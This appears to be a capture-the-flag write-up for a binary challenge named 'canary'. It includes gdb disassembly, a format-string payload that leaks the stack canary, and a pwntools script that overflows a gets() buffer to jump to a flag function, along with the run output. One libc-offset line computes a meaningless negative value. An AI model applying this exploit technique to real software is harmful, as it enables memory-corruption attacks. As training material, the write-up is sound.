### Challenge

```
A tear rolled down her face like a tractor. “David,” she said tearfully, “I don’t want to be a farmer no more.”

—Anonymous

Can you call the flag function in this program (source)? Try it out on the shell server at /problems/2020/canary or by connecting with nc shell.actf.co 20701.
```

### Recon

```
(gdb) disas greet
Dump of assembler code for function greet:
   0x0000000000400891 <+0>:     push   %rbp
   0x0000000000400892 <+1>:     mov    %rsp,%rbp
   0x0000000000400895 <+4>:     sub    $0x60,%rsp
   0x0000000000400899 <+8>:     mov    %fs:0x28,%rax
   0x00000000004008a2 <+17>:    mov    %rax,-0x8(%rbp)
   0x00000000004008a6 <+21>:    xor    %eax,%eax
   0x00000000004008a8 <+23>:    lea    0x382(%rip),%rdi        # 0x400c31
   0x00000000004008af <+30>:    mov    $0x0,%eax
   0x00000000004008b4 <+35>:    callq  0x400660 <printf@plt>
   0x00000000004008b9 <+40>:    lea    -0x60(%rbp),%rax
   0x00000000004008bd <+44>:    mov    %rax,%rdi
   0x00000000004008c0 <+47>:    mov    $0x0,%eax
   0x00000000004008c5 <+52>:    callq  0x400670 <gets@plt>
   0x00000000004008ca <+57>:    lea    0x377(%rip),%rdi        # 0x400c48
   0x00000000004008d1 <+64>:    mov    $0x0,%eax
   0x00000000004008d6 <+69>:    callq  0x400660 <printf@plt>
   0x00000000004008db <+74>:    lea    -0x60(%rbp),%rax
   0x00000000004008df <+78>:    mov    $0xffffffffffffffff,%rcx
   0x00000000004008e6 <+85>:    mov    %rax,%rdx
   0x00000000004008e9 <+88>:    mov    $0x0,%eax
   0x00000000004008ee <+93>:    mov    %rdx,%rdi
   0x00000000004008f1 <+96>:    repnz scas %es:(%rdi),%al
   0x00000000004008f3 <+98>:    mov    %rcx,%rax
   0x00000000004008f6 <+101>:   not    %rax
   0x00000000004008f9 <+104>:   lea    -0x1(%rax),%rdx
   0x00000000004008fd <+108>:   lea    -0x60(%rbp),%rax
   0x0000000000400901 <+112>:   add    %rdx,%rax
   0x0000000000400904 <+115>:   movw   $0xa21,(%rax)
   0x0000000000400909 <+120>:   movb   $0x0,0x2(%rax)
   0x000000000040090d <+124>:   lea    -0x60(%rbp),%rax
   0x0000000000400911 <+128>:   mov    %rax,%rdi
   0x0000000000400914 <+131>:   mov    $0x0,%eax
   0x0000000000400919 <+136>:   callq  0x400660 <printf@plt>
   0x000000000040091e <+141>:   lea    0x33b(%rip),%rdi        # 0x400c60
   0x0000000000400925 <+148>:   mov    $0x0,%eax
   0x000000000040092a <+153>:   callq  0x400660 <printf@plt>
   0x000000000040092f <+158>:   lea    -0x40(%rbp),%rax
   0x0000000000400933 <+162>:   mov    %rax,%rdi
   0x0000000000400936 <+165>:   mov    $0x0,%eax
   0x000000000040093b <+170>:   callq  0x400670 <gets@plt>
   0x0000000000400940 <+175>:   nop
   0x0000000000400941 <+176>:   mov    -0x8(%rbp),%rax
   0x0000000000400945 <+180>:   xor    %fs:0x28,%rax
   0x000000000040094e <+189>:   je     0x400955 <greet+196>
   0x0000000000400950 <+191>:   callq  0x400630 <__stack_chk_fail@plt>
   0x0000000000400955 <+196>:   leaveq 
   0x0000000000400956 <+197>:   retq   
End of assembler dump.

(gdb) break *greet +180
Breakpoint 1 at 0x400945

(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Downloads/canary 
Cock-a-doodle-doo! Cock-a-doodle-doo!

        .-"-.
       / 4 4 \
       \_ v _/
       //   \\
      ((     ))
=======""===""=======
         |||
         '|'

Ahhhh, what a beautiful morning on the farm!
And my canary woke me up at 5 AM on the dot!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Hi! What's your name? %lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx            
Nice to meet you, 7fffffffbaa0-43-ffffffffffffffbb-7ffff7fb8500-12-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-a21786c25-7fffffffe290-0-3cbba4e92bd60f00!
Anything else you want to tell me? 

Breakpoint 1, 0x0000000000400945 in greet ()
(gdb) i r
rax            0x3cbba4e92bd60f00  4376272784290352896
rbx            0x0                 0
rcx            0x7ffff7ee2741      140737352968001
rdx            0x7ffff7fb3590      140737353823632
rsi            0x7ffff7fb0a83      140737353812611
rdi            0x0                 0
rbp            0x7fffffffe190      0x7fffffffe190
rsp            0x7fffffffe130      0x7fffffffe130
r8             0x7fffffffe150      140737488347472
r9             0x7ffff7fb8500      140737353843968
r10            0x400c60            4197472
r11            0x246               582
r12            0x4006a0            4196000
r13            0x7fffffffe290      140737488347792
r14            0x0                 0
r15            0x0                 0
rip            0x400945            0x400945 <greet+180>
eflags         0x246               [ PF ZF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) 

```

### Test

```
from pwn import *

debug = True

if debug:
    conn = process('canary')
else:
    conn = remote()

#print(conn.recv())

payload1 = b'A'* 56#50
payload2 = b'B'* 8
jump = p64(0x400787)
format_string = b'-%llx'* 17

conn.sendlineafter("name? ", format_string)
memory_leak = conn.recvuntil('Anything').decode()
print("Memory Leak: ", memory_leak)

memory_leak = memory_leak.split("\n")[0]
print(memory_leak)

memory_leak = memory_leak.strip("!").strip()
memory_leak = memory_leak.split("-")
print(memory_leak)

canary = int(memory_leak[-1], 16)
libc = int(memory_leak[4], 16)-0x140402921844488
print("Stack Canary Is: ", hex(canary))
print("Calc libc base is: ", hex(libc))

final_payload = payload1 + p64(canary) + payload2 +  jump
print("Final payload is: ", final_payload)
print(conn.recvuntil("tell me?"))
conn.send(final_payload)

#output = conn.recv()
#print(output)

print(conn.interactive())

```

```
(env) kali@kali:~/Downloads$ python3 canary_exploit.py 
[!] Could not find executable 'canary' in $PATH, using './canary' instead
[+] Starting local process './canary': pid 5133
Memory Leak:  Nice to meet you, -7ffca3a69aa0-55-ffffffffffffffa9-7febc11bf500-12-6c252d786c6c252d-2d786c6c252d786c-6c6c252d786c6c25-252d786c6c252d78-786c6c252d786c6c-6c252d786c6c252d-2d786c6c252d786c-6c6c252d786c6c25-252d786c6c252d78-786c6c252d786c6c-a21786c6c252d-d8693e8c719dd200!
Anything
Nice to meet you, -7ffca3a69aa0-55-ffffffffffffffa9-7febc11bf500-12-6c252d786c6c252d-2d786c6c252d786c-6c6c252d786c6c25-252d786c6c252d78-786c6c252d786c6c-6c252d786c6c252d-2d786c6c252d786c-6c6c252d786c6c25-252d786c6c252d78-786c6c252d786c6c-a21786c6c252d-d8693e8c719dd200!
['Nice to meet you, ', '7ffca3a69aa0', '55', 'ffffffffffffffa9', '7febc11bf500', '12', '6c252d786c6c252d', '2d786c6c252d786c', '6c6c252d786c6c25', '252d786c6c252d78', '786c6c252d786c6c', '6c252d786c6c252d', '2d786c6c252d786c', '6c6c252d786c6c25', '252d786c6c252d78', '786c6c252d786c6c', 'a21786c6c252d', 'd8693e8c719dd200']
Stack Canary Is:  0xd8693e8c719dd200
Calc libc base is:  -0x13fc03d60684f88
Final payload is:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xd2\x9dq\x8c>i\xd8BBBBBBBB\x87\x07@\x00\x00\x00\x00\x00'
b' else you want to tell me?'
[*] Switching to interactive mode
 $ 
/bin/cat: flag.txt: No such file or directory
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
None
```

### Solve

```
team6220@actf:/problems/2020/canary$ python3.6
Python 3.6.10 (default, Dec 19 2019, 23:04:32)
[GCC 5.4.0 20160609] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>>
>>>
>>>
>>> conn = process('canary')
[!] Could not find executable 'canary' in $PATH, using './canary' instead
[x] Starting local process './canary'
[+] Starting local process './canary': pid 3577
>>> payload1 = b'A'* 56#50
>>> payload2 = b'B'* 8
>>> jump = p64(0x400787)
>>> format_string = b'-%llx'* 17
>>>
>>> conn.sendlineafter("name? ", format_string)
b'Cock-a-doodle-doo! Cock-a-doodle-doo!\n\n        .-"-.\n       / 4 4 \\\n       \\_ v _/\n       //   \\\\\n      ((     ))\n=======""===""=======\n         |||\n         \'|\'\n\nAhhhh, what a beautiful morning on the farm!\nAnd my canary woke me up at 5 AM on the dot!\n\n       _.-^-._    .--.\n    .-\'   _   \'-. |__|\n   /     |_|     \\|  |\n  /               \\  |\n /|     _____     |\\ |\n  |    |==|==|    |  |\n  |    |--|--|    |  |\n  |    |==|==|    |  |\n^^^^^^^^^^^^^^^^^^^^^^^^\n\nHi! What\'s your name? '
>>> memory_leak = conn.recvuntil('Anything').decode()
>>> print("Memory Leak: ", memory_leak)
Memory Leak:  Nice to meet you, -7ffdf09aab80-55-ffffffffffffffa9-7fd497fad700-12-6c252d786c6c252d-2d786c6c252d786c-6c6c252d786c6c25-252d786c6c252d78-786c6c252d786c6c-6c252d786c6c252d-2d786c6c252d786c-6c6c252d786c6c25-252d786c6c252d78-786c6c252d786c6c-a21786c6c252d-5f51357d122de00!
Anything
>>>
>>> memory_leak = memory_leak.split("\n")[0]
>>> print(memory_leak)
Nice to meet you, -7ffdf09aab80-55-ffffffffffffffa9-7fd497fad700-12-6c252d786c6c252d-2d786c6c252d786c-6c6c252d786c6c25-252d786c6c252d78-786c6c252d786c6c-6c252d786c6c252d-2d786c6c252d786c-6c6c252d786c6c25-252d786c6c252d78-786c6c252d786c6c-a21786c6c252d-5f51357d122de00!
>>>
>>> memory_leak = memory_leak.strip("!").strip()
>>> memory_leak = memory_leak.split("-")
>>> print(memory_leak)
['Nice to meet you, ', '7ffdf09aab80', '55', 'ffffffffffffffa9', '7fd497fad700', '12', '6c252d786c6c252d', '2d786c6c252d786c', '6c6c252d786c6c25', '252d786c6c252d78', '786c6c252d786c6c', '6c252d786c6c252d', '2d786c6c252d786c', '6c6c252d786c6c25', '252d786c6c252d78', '786c6c252d786c6c', 'a21786c6c252d', '5f51357d122de00']
>>>
>>> canary = int(memory_leak[-1], 16)
>>> libc = int(memory_leak[4], 16)-0x140402921844488
>>> print("Stack Canary Is: ", hex(canary))
Stack Canary Is:  0x5f51357d122de00
>>> print("Calc libc base is: ", hex(libc))
Calc libc base is:  -0x13fc05489896d88
>>> final_payload = payload1 + p64(canary) + payload2 +  jump
>>> print("Final payload is: ", final_payload)
Final payload is:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xde"\xd1W\x13\xf5\x05BBBBBBBB\x87\x07@\x00\x00\x00\x00\x00'
>>> print(conn.recvuntil("tell me?"))
b' else you want to tell me?'
>>> conn.send(final_payload)
>>>
>>> #output = conn.recv()
... #print(output)
...
>>> print(conn.interactive())
[*] Switching to interactive mode

actf{youre_a_canary_killer_>:(}
[*] Got EOF while reading in interactive
```

### Reference
* https://ritcsec.wordpress.com/2017/05/18/buffer-overflows-aslr-and-stack-canaries/
* https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/binary-exploitation/
* https://github.com/Naetw/CTF-pwn-tips
* https://www.ret2rop.com/2018/08/format-string-defeating-stack-canary-nx-aslr-remote.html
* https://ctftime.org/writeup/13986#:~:text= 